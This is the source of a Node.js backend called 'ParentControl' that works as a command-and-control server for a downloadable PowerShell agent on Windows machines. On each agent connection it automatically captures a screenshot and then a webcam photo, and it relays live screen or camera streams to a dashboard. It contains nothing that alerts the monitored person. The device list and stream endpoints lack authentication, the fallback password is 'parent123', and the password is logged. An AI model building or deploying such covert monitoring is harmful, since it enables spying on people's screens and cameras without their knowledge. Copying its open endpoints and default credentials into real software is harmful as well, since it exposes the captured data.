// ═══════════════════════════════════════════════════════════════════
// ParentControl — Backend Server
// Node.js + Express + Socket.IO + Raw WebSocket
// ═══════════════════════════════════════════════════════════════════

const express  = require('express');
const http     = require('http');
const { Server } = require('socket.io');
const WebSocket  = require('ws');
const cors     = require('cors');
const path     = require('path');
const crypto   = require('crypto');
const fs       = require('fs');

// ─── App Setup ────────────────────────────────────────────────────────
const app    = express();
const server = http.createServer(app);
const PORT   = process.env.PORT || 3000;

// ─── Config (use env vars on Render) ─────────────────────────────────
const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || 'parent123';

// ─── Middleware ───────────────────────────────────────────────────────
app.use(cors({ origin: '*' }));
app.use(express.json({ limit: '50mb' }));

// ─── Serve client.ps1 for download ───────────────────────────────────
app.get('/download/client.ps1', (req, res) => {
  const clientPath = path.join(__dirname, '..', 'client', 'client.ps1');
  if (fs.existsSync(clientPath)) {
    res.setHeader('Content-Type', 'text/plain; charset=utf-8');
    res.sendFile(path.resolve(clientPath));
  } else {
    res.status(404).send('# client.ps1 not found on server');
  }
});

// ─── Device Registry ─────────────────────────────────────────────────
// Map: deviceId -> { ws, code, info, lastSeen, screenshot, photo, streaming }
const devices = new Map();

// Map: deviceId -> { watchers: [res] }
const streams = new Map();

function generateCode() {
  const used = new Set([...devices.values()].map(d => d.code));
  let code;
  do { code = String(Math.floor(100000 + Math.random() * 900000)); }
  while (used.has(code));
  return code;
}

// ─── Socket.IO — Dashboard clients ───────────────────────────────────
const io = new Server(server, {
  cors: { origin: '*', methods: ['GET', 'POST'] },
  maxHttpBufferSize: 1e8, // 100MB
});

// Password auth middleware
io.use((socket, next) => {
  const pw = socket.handshake.auth.password;
  if (!ADMIN_PASSWORD || pw === ADMIN_PASSWORD) return next();
  next(new Error('auth_failed'));
});

io.on('connection', (socket) => {
  console.log('[Dashboard] Connected:', socket.id);

  // Send current device list immediately
  const list = [...devices.entries()].map(([id, d]) => ({
    id,
    code:       d.code,
    info:       d.info,
    online:     d.ws && d.ws.readyState === WebSocket.OPEN,
    lastSeen:   d.lastSeen,
    streaming:  d.streaming,
    screenshot: d.screenshot,
    photo:      d.photo,
  }));
  socket.emit('device_list', list);

  // ── Handle commands from dashboard ──────────────────────────────
  socket.on('command', ({ deviceId, action }) => {
    const dev = devices.get(deviceId);
    if (!dev || dev.ws.readyState !== WebSocket.OPEN) {
      socket.emit('cmd_error', { deviceId, message: 'Device is offline' });
      return;
    }
    dev.ws.send(JSON.stringify({ type: 'cmd', action }));
    if (action === 'start_live' || action === 'start_screen') dev.streaming = true;
    if (action === 'stop_live'  || action === 'stop_screen')  dev.streaming = false;
    console.log(`[Server] Command → ${dev.code}: ${action}`);
  });

  socket.on('disconnect', () => {
    console.log('[Dashboard] Disconnected:', socket.id);
  });
});

// ─── Raw WebSocket — Agent clients ────────────────────────────────────
const wss = new WebSocket.Server({ noServer: true });

// Route HTTP Upgrade to agent WS server
server.on('upgrade', (req, socket, head) => {
  try {
    const url = new URL(req.url, 'http://localhost');
    if (url.pathname === '/agent') {
      wss.handleUpgrade(req, socket, head, (ws) => wss.emit('connection', ws, req));
    } else {
      socket.destroy();
    }
  } catch (e) {
    socket.destroy();
  }
});

wss.on('connection', (ws) => {
  let deviceId = null;
  console.log('[Agent] New agent connection');

  ws.on('message', (rawData) => {
    let msg;
    try { msg = JSON.parse(rawData.toString()); }
    catch { return; }

    switch (msg.type) {

      // ── Initial handshake ─────────────────────────────────────────
      case 'hello': {
        deviceId     = crypto.randomBytes(8).toString('hex');
        const code   = generateCode();
        const device = {
          ws,
          id:        deviceId,
          code,
          info: {
            hostname:   msg.hostname   || 'Unknown',
            ip:         msg.ip         || 'Unknown',
            os:         msg.os         || 'Windows',
            username:   msg.username   || '',
            resolution: msg.resolution || '',
          },
          lastSeen:  new Date(),
          streaming: false,
          screenshot: null,
          photo:     null,
        };
        devices.set(deviceId, device);

        // Confirm to agent
        ws.send(JSON.stringify({ type: 'connected', deviceId, code }));

        // Notify all dashboards
        io.emit('device_connected', {
          id:      deviceId,
          code,
          info:    device.info,
          online:  true,
          lastSeen: device.lastSeen,
        });

        console.log(`[Agent] Device registered: ${code} (${device.info.hostname})`);

        // Auto-capture on connect
        setTimeout(() => {
          if (ws.readyState === WebSocket.OPEN)
            ws.send(JSON.stringify({ type: 'cmd', action: 'take_screenshot' }));
        }, 2000);

        setTimeout(() => {
          if (ws.readyState === WebSocket.OPEN)
            ws.send(JSON.stringify({ type: 'cmd', action: 'take_photo' }));
        }, 5000);
        break;
      }

      // ── Heartbeat ─────────────────────────────────────────────────
      case 'heartbeat': {
        const dev = devices.get(deviceId);
        if (dev) {
          dev.lastSeen = new Date();
          io.emit('device_heartbeat', { deviceId, lastSeen: dev.lastSeen });
        }
        break;
      }

      // ── Screenshot from agent ─────────────────────────────────────
      case 'screenshot': {
        const dev = devices.get(deviceId);
        if (!dev || !msg.data) break;
        dev.screenshot = msg.data;
        dev.lastSeen   = new Date();
        io.emit('screenshot', { deviceId, data: msg.data, ts: Date.now() });
        console.log(`[Agent] Screenshot received from ${dev.code}`);
        break;
      }

      // ── Camera photo from agent ───────────────────────────────────
      case 'photo': {
        const dev = devices.get(deviceId);
        if (!dev || !msg.data) break;
        dev.photo    = msg.data;
        dev.lastSeen = new Date();
        io.emit('photo', { deviceId, data: msg.data, ts: Date.now() });
        console.log(`[Agent] Camera photo received from ${dev.code}`);
        break;
      }
    }
  });

  ws.on('close', () => {
    if (deviceId && devices.has(deviceId)) {
      const dev = devices.get(deviceId);
      console.log(`[Agent] Device disconnected: ${dev.code}`);
      devices.delete(deviceId);
      io.emit('device_disconnected', { deviceId });
    }
  });

  ws.on('error', (err) => {
    console.error('[Agent] WS error:', err.message);
  });
});

// ─── Stream Endpoints ─────────────────────────────────────────────────

// ffmpeg on child PC pushes mpegts stream here
app.post('/api/stream/:deviceId/push', (req, res) => {
  const { deviceId } = req.params;
  const dev = devices.get(deviceId);
  if (!dev) return res.status(404).end();

  if (!streams.has(deviceId)) streams.set(deviceId, { watchers: [] });
  const stream = streams.get(deviceId);

  io.emit('stream_active', { deviceId });

  req.on('data', (chunk) => {
    // Push chunk to all watching dashboard clients
    stream.watchers = stream.watchers.filter(w => !w.writableEnded);
    stream.watchers.forEach(w => { try { w.write(chunk); } catch (_) {} });
  });

  req.on('end', () => {
    stream.watchers.forEach(w => { try { w.end(); } catch (_) {} });
    streams.delete(deviceId);
    dev.streaming = false;
    io.emit('stream_ended', { deviceId });
    res.status(200).end();
  });

  req.on('error', () => { streams.delete(deviceId); res.end(); });
});

// Dashboard (mpegts.js) fetches the live stream here
app.get('/api/stream/:deviceId', (req, res) => {
  const { deviceId } = req.params;

  res.writeHead(200, {
    'Content-Type':                  'video/mp2t',
    'Transfer-Encoding':             'chunked',
    'Cache-Control':                 'no-cache, no-store',
    'Access-Control-Allow-Origin':   '*',
  });

  if (!streams.has(deviceId)) streams.set(deviceId, { watchers: [] });
  streams.get(deviceId).watchers.push(res);

  req.on('close', () => {
    const s = streams.get(deviceId);
    if (s) s.watchers = s.watchers.filter(w => w !== res);
  });
});

// ─── REST API ─────────────────────────────────────────────────────────
app.get('/api/devices', (req, res) => {
  res.json([...devices.entries()].map(([id, d]) => ({
    id, code: d.code, info: d.info, online: d.ws.readyState === WebSocket.OPEN,
    lastSeen: d.lastSeen, streaming: d.streaming,
  })));
});

app.get('/api/health', (req, res) => {
  res.json({ status: 'ok', devices: devices.size, uptime: process.uptime() });
});

app.get('/', (req, res) => {
  res.json({ name: 'ParentControl Server', version: '1.0.0', devices: devices.size });
});

// ─── Start ────────────────────────────────────────────────────────────
server.listen(PORT, () => {
  console.log(`\n🚀 ParentControl Server`);
  console.log(`   Port    : ${PORT}`);
  console.log(`   WS Agent: ws://localhost:${PORT}/agent`);
  console.log(`   Stream  : POST http://localhost:${PORT}/api/stream/:id/push`);
  console.log(`   Password: ${ADMIN_PASSWORD}\n`);
});
